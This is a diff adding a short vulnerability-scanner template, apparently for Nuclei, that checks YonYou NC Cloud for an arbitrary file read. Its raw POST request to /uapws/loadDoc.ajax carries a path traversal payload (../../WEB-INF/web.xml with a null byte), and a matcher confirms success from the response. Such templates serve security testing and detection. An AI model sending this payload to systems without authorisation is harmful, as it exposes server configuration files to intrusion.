@@ -1,0 +1,26 @@
+id: YonYouNC-Cloud-loadDoc-ReadAnyFile
+
+info:
+  name: YonYouNC-Cloud-loadDoc-ReadAnyFile
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: File Reading
+
+http:
+  - raw:
+      - |
+        POST /uapws/loadDoc.ajax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ws=../../WEB-INF/web.xml%00
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code == 200 && contains (body,'nc.bs.framework.server.LoggerServletFilter')"
